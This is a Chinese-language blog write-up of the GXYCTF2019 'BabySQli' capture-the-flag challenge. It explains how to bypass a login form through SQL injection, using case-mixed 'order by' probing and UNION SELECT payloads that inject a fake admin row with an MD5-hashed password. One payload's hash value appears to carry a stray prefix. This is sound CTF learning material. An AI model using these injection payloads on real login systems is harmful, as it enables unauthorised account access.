+++
title = 'GXYCTF2019---BabySQli'
date = 2024-09-16T18:03:22+08:00
draft = false
categories = ['CS', 'sec', 'wp']
+++

## 题目

登录框
![](../../../../img/Pasted%20image%2020240916180547.png)


---
## 分析

### 爆 wrong user
![](../../../../img/Pasted%20image%2020240916181350.png)

猜测要先通过用户名的检测，注释提示 `select * from user where username = '$name'

![](../../../../img/Pasted%20image%2020240916181354.png)
- 先 base32解密，再base64加密


### 尝试admin正确，爆 wrong password

sqli 正常开始用 `' oRder by x` 测试，发现是3列
- 大小写绕过对 order 的过滤
- 进一步发现括号也过滤了


### 通过 `union` 创建虚拟表

通过 union 需要添加一条数据：
```mysql
select * from users union select 1,'admin','diy password';
```

payload：
```
name=1' union select 1,'admin','234' %23&pw=234
```

但是查询发现表中数据经过 md5加密，所以 payload改为：
```
name=1' union select 1,'admin','234289dff07669d7a23de0ef88d2f7129e7' %23&pw=234
```


---
## 原理：`union` 创建虚拟表

加上 union 关键字后会在表末生成我们自己定义好的数据。
- 虚拟是指 union 产生的数据是临时的，在下次查询的时候就不存在了，因为它没有实际保存在数据库中

![](../../../../img/Pasted%20image%2020240916181534.png)

可以通过往表中添加一条当前用户名和自定义密码的数据，通过对密码的检测。